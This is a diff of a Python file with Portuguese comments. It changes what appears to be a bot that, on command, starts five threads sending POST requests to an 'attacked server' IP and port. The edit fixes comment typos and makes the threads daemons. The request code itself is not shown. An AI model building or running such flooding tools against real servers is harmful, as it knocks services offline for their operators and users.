@@ -37,14 +37,20 @@ def Is_attack(msg):
 #Funcao que ira criar as Threas 
 def attack(IP, attackedServerPort):
 
-    #Definicao das 5 threas 
+    #Definicao das 5 threads 
     channel1 = Thread(target= Post, args= [IP, attackedServerPort])
     channel2 = Thread(target= Post, args= [IP, attackedServerPort])
     channel3 = Thread(target= Post, args= [IP, attackedServerPort])
     channel4 = Thread(target= Post, args= [IP, attackedServerPort])
     channel5 = Thread(target= Post, args= [IP, attackedServerPort])
 
-    #Inicia as 5 threas
+    #seta as threads como daemon
+    channel1.setDaemon(True)
+    channel2.setDaemon(True)
+    channel3.setDaemon(True)
+    channel4.setDaemon(True)
+    channel5.setDaemon(True)
+    #Inicia as 5 threads
     channel1.start()
     channel2.start()
     channel3.start()
@@ -80,6 +86,7 @@ def listening():
     IP = 'http://' + IP + ':' + str(attackedServerPort)
 
     attackThread = Thread(target=attack, args=[IP, attackedServerPort])
+    attackThread.setDaemon(True) # vai setar a thread como daemon, o que vai possibilitar o fechamento delas
     attackThread.start()
 
     while 1:
